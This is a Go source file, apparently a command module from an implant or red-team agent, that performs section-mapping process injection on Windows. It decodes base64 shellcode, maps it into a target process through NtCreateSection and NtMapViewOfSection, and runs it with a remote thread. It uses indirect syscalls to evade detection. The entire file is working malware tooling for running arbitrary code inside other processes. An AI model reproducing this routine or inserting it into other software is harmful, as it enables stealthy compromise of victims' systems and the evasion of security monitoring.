//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"killa/pkg/structs"
)

const (
	SECTION_QUERY                = 0x0001
	SECTION_MAP_WRITE            = 0x0002
	SECTION_MAP_READ             = 0x0004
	SECTION_MAP_EXECUTE          = 0x0008
	SECTION_EXTEND_SIZE          = 0x0010
	SECTION_MAP_EXECUTE_EXPLICIT = 0x0020
	SECTION_ALL_ACCESS           = 0xF001F

	SEC_COMMIT       = 0x08000000
	PAGE_READWRITE   = 0x04
	PAGE_EXECUTE_READ = 0x20
)

// SectionInjectionCommand implements the section-mapping injection command
type SectionInjectionCommand struct{}

// Name returns the command name
func (c *SectionInjectionCommand) Name() string {
	return "section-mapping"
}

// Description returns the command description
func (c *SectionInjectionCommand) Description() string {
	return "Perform process injection using section mapping (NtCreateSection/NtMapViewOfSection)"
}

// SectionInjectionParams represents the parameters
type SectionInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
}

// Execute executes the section-mapping command
func (c *SectionInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	var params SectionInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: No shellcode data provided")
	}

	if params.PID <= 0 {
		return errorResult("Error: Invalid PID specified")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	var sb strings.Builder
	sb.WriteString("[*] Section Mapping Injection\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", params.PID))

	if !IndirectSyscallsAvailable() {
		return errorResult("Error: Section Mapping injection in this agent requires indirect syscalls. They are not available.")
	}

	sb.WriteString("[*] Using indirect syscalls for Section Mapping\n")

	// 1. Open remote process
	var hProcess uintptr
	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	status := IndirectNtOpenProcess(&hProcess, desiredAccess, uintptr(params.PID))
	if status != 0 {
		return errorResult(sb.String() + fmt.Sprintf("[!] NtOpenProcess failed: NTSTATUS 0x%X\n", status))
	}
	defer IndirectNtClose(hProcess)
	sb.WriteString(fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess))

	// 2. Create Section
	var hSection uintptr
	maxSize := int64(len(shellcode))

	status = IndirectNtCreateSection(
		&hSection,
		SECTION_ALL_ACCESS,
		0,
		&maxSize,
		0x40, // Required for section that will be mapped with different protections later
		SEC_COMMIT,
		0,
	)
	if status != 0 {
		return errorResult(sb.String() + fmt.Sprintf("[!] NtCreateSection failed: NTSTATUS 0x%X\n", status))
	}
	defer IndirectNtClose(hSection)
	sb.WriteString(fmt.Sprintf("[+] Created section object: 0x%X\n", hSection))

	// 3. Map View of Section into Local Process (RW)
	var localBaseAddress uintptr
	var localViewSize uintptr

	// We map it in our own process (pseudo-handle -1 is fine, but standard is uintptr(^uintptr(0)))
	localProcess := uintptr(^uintptr(0))

	status = IndirectNtMapViewOfSection(
		hSection,
		localProcess,
		&localBaseAddress,
		0,
		0,
		nil,
		&localViewSize,
		1, // ViewShare
		0,
		PAGE_READWRITE,
	)
	if status != 0 {
		return errorResult(sb.String() + fmt.Sprintf("[!] NtMapViewOfSection (local) failed: NTSTATUS 0x%X\n", status))
	}
	sb.WriteString(fmt.Sprintf("[+] Mapped local view at 0x%X with RW permissions\n", localBaseAddress))

	// 4. Write Shellcode to Local View
	localSlice := unsafe.Slice((*byte)(unsafe.Pointer(localBaseAddress)), len(shellcode))
	copy(localSlice, shellcode)
	sb.WriteString("[+] Copied shellcode to local section view\n")

	// 5. Unmap Local View
	status = IndirectNtUnmapViewOfSection(localProcess, localBaseAddress)
	if status != 0 {
		sb.WriteString(fmt.Sprintf("[-] Warning: NtUnmapViewOfSection (local) failed: NTSTATUS 0x%X\n", status))
	} else {
		sb.WriteString("[+] Unmapped local section view\n")
	}

	// 6. Map View of Section into Remote Process (RX)
	var remoteBaseAddress uintptr
	var remoteViewSize uintptr

	status = IndirectNtMapViewOfSection(
		hSection,
		hProcess,
		&remoteBaseAddress,
		0,
		0,
		nil,
		&remoteViewSize,
		1, // ViewShare
		0,
		PAGE_EXECUTE_READ,
	)
	if status != 0 {
		return errorResult(sb.String() + fmt.Sprintf("[!] NtMapViewOfSection (remote) failed: NTSTATUS 0x%X\n", status))
	}
	sb.WriteString(fmt.Sprintf("[+] Mapped remote view at 0x%X with RX permissions\n", remoteBaseAddress))

	// 7. Create Remote Thread
	var hThread uintptr
	status = IndirectNtCreateThreadEx(&hThread, hProcess, remoteBaseAddress)
	if status != 0 {
		return errorResult(sb.String() + fmt.Sprintf("[!] NtCreateThreadEx failed: NTSTATUS 0x%X\n", status))
	}
	defer IndirectNtClose(hThread)

	sb.WriteString(fmt.Sprintf("[+] Created remote thread (handle: 0x%X)\n", hThread))
	sb.WriteString("[+] Section Mapping Injection completed successfully\n")

	return successResult(sb.String())
}
